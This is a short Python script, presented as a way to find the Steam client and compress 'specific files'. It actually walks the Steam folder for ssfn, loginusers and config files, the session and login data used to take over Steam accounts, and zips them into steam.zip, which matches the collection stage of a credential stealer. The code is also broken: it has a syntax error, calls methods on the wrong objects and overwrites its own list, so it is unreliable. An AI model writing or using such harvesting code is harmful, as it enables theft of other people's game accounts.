# A Python program to find the Steam client and compress specific files

import psutil
import os
import shutil
import zipfile

def SteamProcessLocator(process_name):
    """
    This function searches for a process with the given name and returns its path.
    """
    for proc in psutil.process_iter():
        try:
            if proc.name() == process_name:
                return proc.as_dict(attrs=['pid', 'parent_pid', 'username', 'create_time','memory_info', 'cpu_times','status', 'im_summary'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return None

def get_steam_files(steam_path):
    """
    This function collects specific Steam files and returns a list of their paths.
    """
    files = []
    for root, dirs, files in os.walk(steam_path):
        for filename in files:
            if filename.startswith('ssfn ') or filename == 'config\\loginusers.' or filename == 'config\\config.':
                files.append(os.path.join(root, filename))
    return files

def compress_files(files, output_file):
    """
    This function compresses the given files into an archive file.
    """
    with zipfile.ZipFile(output_file, 'w') as archive:
        for file in files:
            archive.write(file, os.path.relpath(file, steam_path))

if __name__ == "__main__":
    steam_path = SteamProcessLocator("Steam").as_dict()['command_line']
    steam_path = steam_path.split("\"')[0]
    steam_files = get_steam_files(steam_path)
    compress_files(steam_files,'steam.zip')
    print("Steam files have been compressed into steam.zip.")
